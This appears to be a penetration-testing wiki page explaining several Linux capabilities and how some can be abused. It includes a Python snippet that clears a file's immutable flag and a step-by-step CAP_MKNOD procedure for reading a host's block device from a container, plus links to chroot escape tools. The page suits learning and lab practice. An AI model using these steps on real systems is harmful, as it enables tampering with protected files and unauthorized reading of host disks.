# Linux Capabilities - CAP MISC

## CAP_LINUX_IMMUTABLE


**This means that it's possible modify inode attributes.** You cannot escalate privileges directly with this capability.

**Example with binary**

If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

> [!TIP]
> Note that usually this immutable attribute is set and remove using:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```


## CAP_SYS_CHROOT


[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through known vulnerabilities:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)


## CAP_SYS_BOOT


[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) not only allows the execution of the `reboot(2)` system call for system restarts, including specific commands like `LINUX_REBOOT_CMD_RESTART2` tailored for certain hardware platforms, but it also enables the use of `kexec_load(2)` and, from Linux 3.17 onwards, `kexec_file_load(2)` for loading new or signed crash kernels respectively.


## CAP_SYSLOG


[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) was separated from the broader **CAP_SYS_ADMIN** in Linux 2.6.37, specifically granting the ability to use the `syslog(2)` call. This capability enables the viewing of kernel addresses via `/proc` and similar interfaces when the `kptr_restrict` setting is at 1, which controls the exposure of kernel addresses. Since Linux 2.6.39, the default for `kptr_restrict` is 0, meaning kernel addresses are exposed, though many distributions set this to 1 (hide addresses except from uid 0) or 2 (always hide addresses) for security reasons.

Additionally, **CAP_SYSLOG** allows accessing `dmesg` output when `dmesg_restrict` is set to 1. Despite these changes, **CAP_SYS_ADMIN** retains the ability to perform `syslog` operations due to historical precedents.


## CAP_MKNOD


[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) extends the functionality of the `mknod` system call beyond creating regular files, FIFOs (named pipes), or UNIX domain sockets. It specifically allows for the creation of special files, which include:

- **S_IFCHR**: Character special files, which are devices like terminals.
- **S_IFBLK**: Block special files, which are devices like disks.

This capability is essential for processes that require the ability to create device files, facilitating direct hardware interaction through character or block devices.

It is a default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:

1. Have initial access to the host (Unprivileged).
2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
3. Host and container should share the same user namespace.

**Steps to Create and Access a Block Device in a Container:**

1. **On the Host as a Standard User:**

   - Determine your current user ID with `id`, e.g., `uid=1000(standarduser)`.
   - Identify the target device, for example, `/dev/sdb`.

2. **Inside the Container as `root`:**

```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```

3. **Back on the Host:**

```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```

This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container, exploiting shared user namespaces and permissions set on the device.

### CAP_SETPCAP

**CAP_SETPCAP** enables a process to **alter the capability sets** of another process, allowing for the addition or removal of capabilities from the effective, inheritable, and permitted sets. However, a process can only modify capabilities that it possesses in its own permitted set, ensuring it cannot elevate another process's privileges beyond its own. Recent kernel updates have tightened these rules, restricting `CAP_SETPCAP` to only diminish the capabilities within its own or its descendants' permitted sets, aiming to mitigate security risks. Usage requires having `CAP_SETPCAP` in the effective set and the target capabilities in the permitted set, utilizing `capset()` for modifications. This summarizes the core function and limitations of `CAP_SETPCAP`, highlighting its role in privilege management and security enhancement.

**`CAP_SETPCAP`** is a Linux capability that allows a process to **modify the capability sets of another process**. It grants the ability to add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, there are certain restrictions on how this capability can be used.

A process with `CAP_SETPCAP` **can only grant or remove capabilities that are in its own permitted capability set**. In other words, a process cannot grant a capability to another process if it does not have that capability itself. This restriction prevents a process from elevating the privileges of another process beyond its own level of privilege.

Moreover, in recent kernel versions, the `CAP_SETPCAP` capability has been **further restricted**. It no longer allows a process to arbitrarily modify the capability sets of other processes. Instead, it **only allows a process to lower the capabilities in its own permitted capability set or the permitted capability set of its descendants**. This change was introduced to reduce potential security risks associated with the capability.

To use `CAP_SETPCAP` effectively, you need to have the capability in your effective capability set and the target capabilities in your permitted capability set. You can then use the `capset()` system call to modify the capability sets of other processes.

In summary, `CAP_SETPCAP` allows a process to modify the capability sets of other processes, but it cannot grant capabilities that it doesn't have itself. Additionally, due to security concerns, its functionality has been limited in recent kernel versions to only allow reducing capabilities in its own permitted capability set or the permitted capability sets of its descendants.


## References


**Most of these examples were taken from some labs of** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), so if you want to practice this privesc techniques I recommend these labs.

**Other references**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
